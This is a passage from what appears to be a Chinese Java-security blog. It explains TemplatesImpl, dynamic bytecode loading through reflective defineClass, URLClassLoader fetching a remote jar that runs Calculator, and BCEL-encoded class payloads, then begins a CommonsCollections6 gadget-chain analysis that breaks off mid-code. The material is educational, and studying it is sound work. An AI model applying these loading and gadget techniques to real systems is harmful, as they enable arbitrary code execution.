<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">JavaClass</span> <span class="variable">javaClass</span> <span class="operator">=</span> Repository.lookupClass(ClassLoaderTestEntity.class);</span><br><span class="line"><span class="type">byte</span>[] code = javaClass.getBytes();</span><br><span class="line">System.out.println(<span class="keyword">new</span> <span class="title class_">BASE64Encoder</span>().encode(code));</span><br></pre></td></tr></table></figure>

<p>通过<code>ClassLoader</code>来加载字节码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">byte</span>[] code = <span class="keyword">new</span> <span class="title class_">BASE64Decoder</span>().decodeBuffer(<span class="string">&quot;yv66vgAAADQAIQoABwASCQATABQIABUKABYAFwgAGAcAGQcAGgEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAXTENsYXNzTG9hZGVyVGVzdEVudGl0eTsBAAg8Y2xpbml0PgEAClNvdXJjZUZpbGUBABpDbGFzc0xvYWRlclRlc3RFbnRpdHkuamF2YQwACAAJBwAbDAAcAB0BACNDbGFzc0xvYWRlclRlc3RFbnRpdHlDb25zdHJ1Y3Rvci4uLgcAHgwAHwAgAQAjQ2xhc3NMb2FkZXJUZXN0RW50aXR5U3RhdGljQmxvY2suLi4BABVDbGFzc0xvYWRlclRlc3RFbnRpdHkBABBqYXZhL2xhbmcvT2JqZWN0AQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABgAHAAAAAAACAAEACAAJAAEACgAAAD8AAgABAAAADSq3AAGyAAISA7YABLEAAAACAAsAAAAOAAMAAAAFAAQABgAMAAcADAAAAAwAAQAAAA0ADQAOAAAACAAPAAkAAQAKAAAAJQACAAAAAAAJsgACEgW2AASxAAAAAQALAAAACgACAAAAAwAIAAQAAQAQAAAAAgAR&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">Method</span> <span class="variable">defineClass</span> <span class="operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>, String.class, <span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">int</span>.class);</span><br><span class="line">defineClass.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">Class</span> <span class="variable">aClass</span> <span class="operator">=</span> (Class) defineClass.invoke(ClassLoader.getSystemClassLoader(), <span class="string">&quot;ClassLoaderTestEntity&quot;</span>, code, <span class="number">0</span>, code.length);</span><br></pre></td></tr></table></figure>

<p>运行后我们可以看到控制台并没有打印测试类里的两个<code>println</code>的输出</p>
<p><img src="/images/Java%E5%AE%89%E5%85%A8-TemplateImpl%E7%9A%84%E7%94%A8%E5%A4%84%E4%B8%8E%E5%88%86%E6%9E%90/640-20230109224024610.png" alt="图片"></p>
<p>随后我们增加上<code>newInstance</code>，这个时候就能看到对应的输出了。</p>
<p><img src="/images/Java%E5%AE%89%E5%85%A8-TemplateImpl%E7%9A%84%E7%94%A8%E5%A4%84%E4%B8%8E%E5%88%86%E6%9E%90/640-20230109224030926.png" alt="图片"></p>
<p>由此得出<code>defineClass</code>仅仅是加字节码加载进<code>jvm</code>中，加载后的类并没有进行初始化。如果你想要它初始化，则需要调用<code>newInstance</code>进行实例(这里要牢记)。</p>
<p>那么我们再回到前边说的那个关于为什么要继承<code>AbstractTranslet</code>的问题上。</p>
<p>回到前边，<code>loader.defineClass</code>在加载完<code>_bytecodes</code>后将返回的<code>Class</code>类存储在了<code>_class这</code>个数组中。</p>
<p><img src="/images/Java%E5%AE%89%E5%85%A8-TemplateImpl%E7%9A%84%E7%94%A8%E5%A4%84%E4%B8%8E%E5%88%86%E6%9E%90/640-20230109224038354.png" alt="图片"></p>
<p>接着往下我们能看到存在一个判断，判断<code>superClass</code>的类型是否为<code>ABSTRACT_TRANSLET</code>类型，是的话则将索引<code>i</code>赋值给<code>_transletIndex</code>。<code>superClass</code>其实就是我们传递进去的字节码类的父类。</p>
<p><img src="/images/Java%E5%AE%89%E5%85%A8-TemplateImpl%E7%9A%84%E7%94%A8%E5%A4%84%E4%B8%8E%E5%88%86%E6%9E%90/640-20230109224045630.png" alt="图片"></p>
<p><code>ABSTRACT_TRANSLET的</code>值为<code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code></p>
<p><img src="/images/Java%E5%AE%89%E5%85%A8-TemplateImpl%E7%9A%84%E7%94%A8%E5%A4%84%E4%B8%8E%E5%88%86%E6%9E%90/640-20230109224052371.png" alt="图片"></p>
<p>如果我们不继承<code>AbstractTranslet</code>，则代码将会进入到<code>else</code>的位置，可以看到此时<code>_auxClasses</code>的值为<code>null</code>，意味着这段代码将抛出空指针异常。</p>
<p><img src="/images/Java%E5%AE%89%E5%85%A8-TemplateImpl%E7%9A%84%E7%94%A8%E5%A4%84%E4%B8%8E%E5%88%86%E6%9E%90/640-20230109224058944.png" alt="图片"></p>
<p>然后我们又可以看到后续还有一个<code>if</code>判断，如果<code>_trasnletIndex</code>小于<code>0</code>，那么将抛出异常。</p>
<p>意味着上边的代码进入到<code>else</code>或者比较靠后的if都将抛出异常，那么也就不会进行后续的代码。</p>
<p><img src="/images/Java%E5%AE%89%E5%85%A8-TemplateImpl%E7%9A%84%E7%94%A8%E5%A4%84%E4%B8%8E%E5%88%86%E6%9E%90/640-20230109224107452.png" alt="图片"></p>
<p>接着我们回到<code>getTransletInstance</code>函数上，可以看到有一行代码从<code>_class</code>中取出了一个值，那么这个值呢其实就是我们自定义的那段字节码经过<code>loader.defineClass</code>处理后返回的Class对象，但是需要注意从<code>_class</code>中取值是根据<code>_transletIndex</code>来取的，这个<code>_transletIndex</code>实际上就是前边那个if判断那里赋值的变量。</p>
<p>之后将这个<code>Class</code>对象强转为<code>AbstractTranslet</code>然后再进行了<code>newInstance</code>的调用。</p>
<p><img src="/images/Java%E5%AE%89%E5%85%A8-TemplateImpl%E7%9A%84%E7%94%A8%E5%A4%84%E4%B8%8E%E5%88%86%E6%9E%90/640-20230109224115162.png" alt="图片"></p>
<p>在前边我说过，如果你想要它初始化(也就是能让构造函数执行)，则需要调用<code>newInstance</code>进行实例，这样才能执行我们想要执行的Java代码，也就是下图的这一段。</p>
<p><img src="/images/Java%E5%AE%89%E5%85%A8-TemplateImpl%E7%9A%84%E7%94%A8%E5%A4%84%E4%B8%8E%E5%88%86%E6%9E%90/640-20230109224125150.png" alt="图片"></p>
<p>所以如果你传递的字节码类并不是一个<code>AbstractTranslet</code>的类型，那么在前边的if判断那里就没法对<code>_transletIndex</code>进行赋值，同时代码也无法执行到这里，因为前边就已经报错了，并且<code>_transletIndex</code>都没有赋值。导致后续的<code>newInstance()</code>无法被调用，那么就意味着无法执行自定义字节码类的构造函数或<code>static</code>块中的代码，那么也就无法达到攻击的效果。所以这就是为什么需要是一<code>AbstractTranslet</code>的子类的原因。</p>
<h1 id="执行过程"><a href="#执行过程" class="headerlink" title="执行过程"></a>执行过程</h1><p><code>TemplatesImpl#newTransformer</code> -&gt; <code>TemplatesImpl#getTransletInstance</code> -&gt; <code>TemplatesImpl#defineTransletClasses</code> -&gt; <code>获取到TransletClassLoader</code> -&gt; <code>回到TemplatesImpl#getTransletInstance中调用newInstance</code></p>
<p>&#x3D;&#x3D;到这里TemplatesImpl并没有结束，我将如何让它配合利用链的使用放在下一篇文章中。&#x3D;&#x3D;</p>
<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p>文章内容借鉴参考</p>
<p>Java安全名漫谈: <a target="_blank" rel="noopener" href="https://github.com/phith0n/JavaThings">https://github.com/phith0n/JavaThings</a></p>

      
	</div>

<div class="meta">
	
</div>
</article>

  <article class="post">
	<h2 class="title">
		<a href="2022/12/19/Java安全-字节码动态加载/">Java安全-字节码动态加载</a>
	</h2>
    <div class="entry-content">
    <div class="meta">
      <div class="date">发布时间: <time datetime="2022-12-19T13:11:48.000Z" itemprop="datePublished">2022-11-19</time>
</div>
      <div class="tags">标签: 

<a href="/tags/Java安全/">Java安全</a>
</div>
    </div>
      
        <p>后续的文章中会涉及到字节码和类加载器的知识点，这里对Java字节码和常见的类加载器简单介绍与字节码的动态加载演示。</p>
<h1 id="Java字节码定义"><a href="#Java字节码定义" class="headerlink" title="Java字节码定义"></a>Java字节码定义</h1><p>Java字节码是Java虚拟机执行的一种虚拟指令格式(网上抄的)，总之就是Java虚拟机能识别的都可以称为Java字节码。</p>
<p>那这东西是怎么个存在的形式的呢？我们来写一段<code>HelloWorld</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;HelloWorld&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用javac进行编译为<code>.class</code>文件</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javac Main.java</span><br></pre></td></tr></table></figure>

<p>使用<code>hexdump</code>进行查看，像开头的<code>cafebabe</code>就是<code>.class</code>文件的文件头标识，<code>.class</code>文件的内容就是标准的java字节码。其实他们就是一些有特定含义的字节数据</p>
<p><img src="/images/Java%E5%AE%89%E5%85%A8-%E5%AD%97%E8%8A%82%E7%A0%81%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/640-20230109222937578.png" alt="图片"></p>
<p><code>.class</code>文件结构在这里不会进行讲解，有兴趣的可以查阅其他资料。</p>
<h1 id="ClassLoader"><a href="#ClassLoader" class="headerlink" title="ClassLoader"></a>ClassLoader</h1><p>类加载器，用于将字节码加载到<code>JVM</code>内存中。</p>
<p>下边我们来使用<code>ClassLoader</code>来加载一下自定义的字节码，先创建一个普通的Java类，并且在该类的静态代码块和构造函数中添加两个打印两串字符串。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Entity</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;EntityStaticBlock...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Entity</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;EntityConstructor...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>获取这个类的字节码，这里我们使用<code>BCEL</code>的<code>Repository</code>来操作，比较方便一些，后续也会讲到<code>BCEL</code>。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">JavaClass</span> <span class="variable">javaClass</span> <span class="operator">=</span> Repository.lookupClass(Entity.class);</span><br><span class="line"><span class="comment">// 这里返回的byte[]就是对应的字节码</span></span><br><span class="line"><span class="type">byte</span>[] byteCodes = cls.getBytes();</span><br><span class="line">System.out.println(byteCodes);</span><br></pre></td></tr></table></figure>

<p>看下图中的<code>byte</code>数组中的值就为字节码</p>
<p><img src="/images/Java%E5%AE%89%E5%85%A8-%E5%AD%97%E8%8A%82%E7%A0%81%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/640-20230109223034805.png" alt="图片"></p>
<p>有了字节码后我们就使用<code>ClassLoader</code>来进行加载字节码，那么在<code>ClassLoader</code>中想要加载字节码，就需要使用<code>defineClass</code>这个函数。这个函数是私有的需要通过反射来获取</p>
<p>definClass的三个参数(这里只介绍三个参数的那个)</p>
<ul>
<li>需要加载的字节码数组</li>
<li>字节码起始位</li>
<li>字节码长度</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取字节码</span></span><br><span class="line"><span class="type">JavaClass</span> <span class="variable">cls</span> <span class="operator">=</span> Repository.lookupClass(Entity.class);</span><br><span class="line"><span class="type">byte</span>[] bytecodes = cls.getBytes();</span><br><span class="line"><span class="comment">// 反射获取defineClass函数</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">defineClassMethod</span> <span class="operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>, <span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">int</span>.class);</span><br><span class="line"><span class="comment">// 设置可访问权限</span></span><br><span class="line">defineClassMethod.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="comment">// 调用函数加载字节码</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">entity</span> <span class="operator">=</span> (Class) defineClassMethod.invoke(ClassLoader.getSystemClassLoader(), bytecodes, <span class="number">0</span>, bytecodes.length);</span><br><span class="line"><span class="comment">// 创建实例</span></span><br><span class="line">entity.newInstance();</span><br></pre></td></tr></table></figure>

<p>执行后发生了报错，这个主要原因是因为当前获取的这个<code>ClassLoader</code>中已经存在一个全类名叫<code>Entity</code>的类了，所以我们无法再加载一个同类名的类。</p>
<p><img src="/images/Java%E5%AE%89%E5%85%A8-%E5%AD%97%E8%8A%82%E7%A0%81%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/640-20230109223109879.png" alt="图片"></p>
<p>我们将字节码转换为<code>Base64</code>，然后将用到<code>Entity</code>的代码进行删除。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">byte</span>[] bytecodes = <span class="keyword">new</span> <span class="title class_">BASE64Decoder</span>().decodeBuffer(<span class="string">&quot;yv66vgAAADQAIQoABwASCQATABQIABUKABYAFwgAGAcAGQcAGgEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAITEVudGl0eTsBAAg8Y2xpbml0PgEAClNvdXJjZUZpbGUBAAtFbnRpdHkuamF2YQwACAAJBwAbDAAcAB0BABRFbnRpdHlDb25zdHJ1Y3Rvci4uLgcAHgwAHwAgAQAURW50aXR5U3RhdGljQmxvY2suLi4BAAZFbnRpdHkBABBqYXZhL2xhbmcvT2JqZWN0AQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABgAHAAAAAAACAAEACAAJAAEACgAAAD8AAgABAAAADSq3AAGyAAISA7YABLEAAAACAAsAAAAOAAMAAAAGAAQABwAMAAgADAAAAAwAAQAAAA0ADQAOAAAACAAPAAkAAQAKAAAAJQACAAAAAAAJsgACEgW2AASxAAAAAQALAAAACgACAAAAAwAIAAQAAQAQAAAAAgAR&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">Method</span> <span class="variable">defineClassMethod</span> <span class="operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>, <span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">int</span>.class);</span><br><span class="line">defineClassMethod.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Class</span> <span class="variable">entity</span> <span class="operator">=</span> (Class) defineClassMethod.invoke(ClassLoader.getSystemClassLoader(), bytecodes, <span class="number">0</span>, bytecodes.length);</span><br><span class="line">entity.newInstance();</span><br></pre></td></tr></table></figure>

<p>这样就可以加载字节码了，因为在代码中没有用到<code>Entity</code>，所以就没有加载进<code>ClassLoader</code>中，而后续我们就可以通过<code>definClass</code>来进行加载。</p>
<p><img src="/images/Java%E5%AE%89%E5%85%A8-%E5%AD%97%E8%8A%82%E7%A0%81%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/640-20230109223139813.png" alt="图片"></p>
<p>还有另外一种方式就是自定义<code>ClassLoader</code>，每个<code>ClassLoader</code>之间是存在隔离机制的，所以是可以加载同名类。很多<code>WebShell</code>中也是通过自定义<code>ClassLoader</code>来加载恶意利用代码的。</p>
<p>那到这里我们就知道，有相应的字节码后我们就可以通过<code>ClassLoader</code>的<code>defineClass</code>函数即可将字节码加载进内存中，然后通过<code>newInstance</code>来创建实例，这样就可以达到通过字节码来执行任意的代码。</p>
<h1 id="URLClassLoader"><a href="#URLClassLoader" class="headerlink" title="URLClassLoader"></a>URLClassLoader</h1><p><code>URLClassLoader</code>继承自<code>ClassLoader</code>，它主要提供了远程加载字节码的能力，可以利用来实现远程加载<code>jar</code>包或<code>class</code>文件。</p>
<p>我们来创建一个Jar包，并且在这个Jar包内编写一个Exp类。代码如下，在exp函数里调用命令行打开计算器，打成Jar包。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Exp</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">exp</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">      	Runtime.getRuntime().exec(<span class="string">&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>挂在httpserver下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m http.server 88882</span><br></pre></td></tr></table></figure>

<p>通过以下几行简单的代码即可实现远程加载jar包进行函数调用</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://127.0.0.1:8882/Exp.jar&quot;</span>);</span><br><span class="line"><span class="type">URLClassLoader</span> <span class="variable">urlClassLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLClassLoader</span>(<span class="keyword">new</span> <span class="title class_">URL</span>[]&#123;url&#125;);</span><br><span class="line">Class&lt;?&gt; expClass = urlClassLoader.loadClass(<span class="string">&quot;Exp&quot;</span>);</span><br><span class="line">expClass.getMethod(<span class="string">&quot;exp&quot;</span>).invoke(<span class="literal">null</span>, <span class="literal">null</span>);</span><br></pre></td></tr></table></figure>

<p><img src="/images/Java%E5%AE%89%E5%85%A8-%E5%AD%97%E8%8A%82%E7%A0%81%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/640-20230109223300007.png" alt="图片"></p>
<h1 id="BCELClassLoader"><a href="#BCELClassLoader" class="headerlink" title="BCELClassLoader"></a>BCELClassLoader</h1><p><code>BCEL</code>全称是<code>Apache Commons BCEL</code>，原先是一个单独的第三方库，后由<code>OracleJdk</code>引入，对应的包<code>com.sun.org.apache.bcel</code>。</p>
<p>&#x3D;&#x3D;注意，在Jdk8u251的更新中，BCELClassLoader被移除。&#x3D;&#x3D;</p>
<p>下边先介绍一下BCEL中主要的2个类</p>
<h2 id="Repository"><a href="#Repository" class="headerlink" title="Repository"></a>Repository</h2><p>Repository用于将一个Java类转换成原生字节码，相当于Javac命令来编译.java文件。这个在前边已经多次用到了</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">JavaClass</span> <span class="variable">javaClass</span> <span class="operator">=</span> Repository.lookupClass(Hello.class);</span><br><span class="line"><span class="comment">// 获取原生的字节码</span></span><br><span class="line">System.out.println(javaClass.getBytes());</span><br></pre></td></tr></table></figure>

<h2 id="Utility"><a href="#Utility" class="headerlink" title="Utility"></a>Utility</h2><p><code>Utility</code>用于将原生的字节码转换成<code>BCEL</code>格式的字节码和进行相应的解码。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">JavaClass</span> <span class="variable">javaClass</span> <span class="operator">=</span> Repository.lookupClass(Entity.class);</span><br><span class="line"><span class="type">String</span> <span class="variable">bcelStr</span> <span class="operator">=</span> <span class="string">&quot;$$BCEL$$&quot;</span> + Utility.encode(javaClass.getBytes(), <span class="literal">true</span>);</span><br><span class="line">System.out.println(bcelStr);</span><br></pre></td></tr></table></figure>

<p><img src="/images/Java%E5%AE%89%E5%85%A8-%E5%AD%97%E8%8A%82%E7%A0%81%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/640-20230109223401635.png" alt="图片"></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 这是解码</span></span><br><span class="line"><span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> bcelStr.indexOf(<span class="string">&quot;$$BCEL$$&quot;</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">realName</span> <span class="operator">=</span> bcelStr.substring(index + <span class="number">8</span>);</span><br><span class="line"><span class="type">byte</span>[] bytes = Utility.decode(realName, <span class="literal">true</span>);</span><br><span class="line">System.out.println(bytes);</span><br></pre></td></tr></table></figure>

<p><img src="/images/Java%E5%AE%89%E5%85%A8-%E5%AD%97%E8%8A%82%E7%A0%81%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/640-20230109223415287.png" alt="图片"></p>
<h2 id="BCEL类加载器"><a href="#BCEL类加载器" class="headerlink" title="BCEL类加载器"></a>BCEL类加载器</h2><p>回到<code>BCELClassLoader</code>上，需要注意<code>BCEL</code>的<code>ClassLoader</code>名字也叫<code>ClassLoader</code>，主要通过导入的包名做区分。</p>
<p><code>com.sun.org.apache.bcel.internal.util.ClassLoader</code></p>
<p><img src="/images/Java%E5%AE%89%E5%85%A8-%E5%AD%97%E8%8A%82%E7%A0%81%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/640-20230109223424410.png" alt="图片"></p>
<p>前边先通过<code>Utility</code>获取对应的<code>BCEL</code>字节码，然后使用对应的<code>ClassLoader</code>进行加载即可。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">bcelStr</span> <span class="operator">=</span> <span class="string">&quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$AmP$cbN$c2$40$U$3dC$x$z$a5$K$f2$f0$fdba$C$$$ca$c6$jD$T$89$ae$g5$a9a$3f$d4$G$HKk$ca$d4$84$cf$d2$85$s$$$fc$A$3f$cax$a7$rD$Tg$92$3bs$ce$b9$f7$cc$bd$f3$f5$fd$f1$J$e0$U$z$L$Gj$r$d4$d10$d1$b4$b0$81M$T$5b$G$b6$N$ec0$U$fb$o$S$f2$8cAkw$86$M$fa$m$be$P$Y$w$ae$88$82$ebt$3a$K$92$3b$3e$K$89$a9$b9$b1$cf$c3$nO$84$c2$LR$97$Pb$c6$60$ba$97$91$Ur$de$a3k$df$P$X$86$96$X$a7$89$l$5c$J$95Y$ce3$9c$J$7f$e66L$94$M$ec$da$d8$c3$3eC$p$97$Gq4$93I$ea$cb8q$i$c7$c0$81$8dC$i$zeOr$v$fc$8b0$f6$lI$a6$bes$9a$a1$aa$y$bb$n$8f$c6$dd$9b$d1$q$f0$e5$l$ca$9b$cfd0$a5$e9$e2$94$84$a6$9b$v$o$ee$de$s$o$92$9eL$C$3e$a5$ae$eb$ff$d0$M$c6$93BaDum$f7$97$a5$qz$dc$eb$M$d1B$91$beV$ad$C$98$g$8a$a2E$e8$3c$c3$c0$ea$c9$3b$d8$x$K5$ed$N$faK$96V$a6$b8$G$8db$R$3a$V$ab$bf$b0$J$d9y$B$ed5$3aMT$96f$c7T$a5VI$Z$ad$y$8cXfde$92F$e9$3a1$d5$ec$81$f5$l$db4Be$f8$B$A$A&quot;</span>;</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">ClassLoader</span>().loadClass(bcelStr).newInstance();</span><br></pre></td></tr></table></figure>

<p><img src="/images/Java%E5%AE%89%E5%85%A8-%E5%AD%97%E8%8A%82%E7%A0%81%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/640-20230109223457436.png" alt="图片"></p>
<p>需要注意的是，<code>BCEL</code>字节码需要以<code>$$BCEL$$</code>进行开头，不加的话则会报错。</p>
<p><img src="/images/Java%E5%AE%89%E5%85%A8-%E5%AD%97%E8%8A%82%E7%A0%81%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/640-20230109223508725.png" alt="图片"></p>
<p>这里直接跟进看一下<code>loadClass</code>函数的逻辑，这里存在一个<code>if else</code>判断，当你是以<code>$$BCEL$$</code>开头则会选择去<code>createClass</code>，否则的话则是去查找这个字节码类，找不到则会抛出异常。</p>
<p><img src="/images/Java%E5%AE%89%E5%85%A8-%E5%AD%97%E8%8A%82%E7%A0%81%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/640-20230109223528952.png" alt="图片"></p>
<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p>文章内容借鉴参考</p>
<p>Java安全名漫谈: <a target="_blank" rel="noopener" href="https://github.com/phith0n/JavaThings">https://github.com/phith0n/JavaThings</a></p>
<p>javasec: <a target="_blank" rel="noopener" href="https://www.javasec.org/javase/">https://www.javasec.org/javase/</a></p>

      
	</div>

<div class="meta">
	
</div>
</article>

  <article class="post">
	<h2 class="title">
		<a href="2022/12/04/Java安全-CommonsCollections6分析/">Java安全-CommonsCollections6分析</a>
	</h2>
    <div class="entry-content">
    <div class="meta">
      <div class="date">发布时间: <time datetime="2022-12-04T13:18:38.000Z" itemprop="datePublished">2022-18-4</time>
</div>
      <div class="tags">标签: 

<a href="/tags/Java安全/">Java安全</a>
</div>
    </div>
      
        <p>在前边的<code>CC1</code>链中会提到无法适用于<code>Java8u71</code>后的版本，那么本篇的<code>CommonsCollections6</code>可用于解决⾼版本Java的利⽤问题。</p>
<p><strong>注: 本文的代码和分析过程均参考p牛的《Java安全名漫谈》实现: <a target="_blank" rel="noopener" href="https://github.com/phith0n/JavaThings%EF%BC%8C%E9%9D%9E%E5%B8%B8%E6%84%9F%E8%B0%A2%EF%BC%81">https://github.com/phith0n/JavaThings，非常感谢！</a></strong></p>
<h1 id="核心思路"><a href="#核心思路" class="headerlink" title="核心思路"></a>核心思路</h1><p>CC1的 <code>LazyMap</code>或 <code>TransformedMap</code>的触发都需要用到 <code>AnnotationInvocationHandler</code>，那么在 <code>Java8u71</code>后的版本对 <code>AnnotationInvocationHandler</code>进行了修改，导致无法利用，解决该问题的办法就是找到能同样触发 <code>LazyMap</code>或 <code>TransformedMap</code>的地方。</p>
<p>下边以<code>LazyMap</code>进行讲解</p>
<h1 id="TiedMapEntry"><a href="#TiedMapEntry" class="headerlink" title="TiedMapEntry"></a>TiedMapEntry</h1><p>这个类用来代替原先<code>AnnotationInvocationHandler</code>进行触发<code>LazyMap</code></p>
<p>全类名: <code>org.apache.commons.collections.keyvalue.TiedMapEntry</code></p>
<p>主要关注下边2个函数，在其 <code>getValue</code>⽅法中调⽤了 <code>this.map.get</code>，⽽其<code>hashCode</code>⽅法调⽤了<code>getValue</code>⽅法。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getValue</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="comment">// 这个map可以赋值为LazyMap，通过构造函数赋值给map。</span></span><br><span class="line">  <span class="keyword">return</span> map.get(key);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 在TiedMapEntry的hashCode中会调用getValue，也就是上边那个函数。</span></span><br><span class="line"><span class="keyword">public</span> <span 